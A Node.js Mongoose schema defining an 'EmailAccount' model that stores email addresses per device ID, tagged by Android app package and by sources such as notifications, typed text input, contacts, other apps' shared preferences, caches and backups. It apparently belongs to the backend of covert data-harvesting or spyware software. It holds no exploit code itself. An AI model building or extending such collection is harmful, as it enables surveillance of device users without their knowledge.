const mongoose = require('mongoose');

const emailAccountSchema = new mongoose.Schema({
    email: {
        type: String,
        required: true,
        lowercase: true,
        trim: true
    },
    packageName: {
        type: String,
        required: true
    },
    appName: {
        type: String,
        required: true
    },
    source: {
        type: String,
        required: true,
        enum: ['notification', 'text_input', 'system', 'account_manager', 'contacts', 'gmail_channel', 'shared_prefs', 'app_context', 'cache', 'backup']
    },
    timestamp: {
        type: Number,
        required: true
    },
    isActive: {
        type: Boolean,
        default: true
    },
    lastSeen: {
        type: Number,
        required: true
    },
    deviceId: {
        type: String,
        required: true
    },
    createdAt: {
        type: Date,
        default: Date.now
    }
}, {
    timestamps: true
});

// Create compound index for unique email per device
emailAccountSchema.index({ email: 1, deviceId: 1 }, { unique: true });

// Create index for efficient queries
emailAccountSchema.index({ deviceId: 1 });
emailAccountSchema.index({ source: 1 });
emailAccountSchema.index({ isActive: 1 });
emailAccountSchema.index({ createdAt: -1 });

module.exports = mongoose.model('EmailAccount', emailAccountSchema);
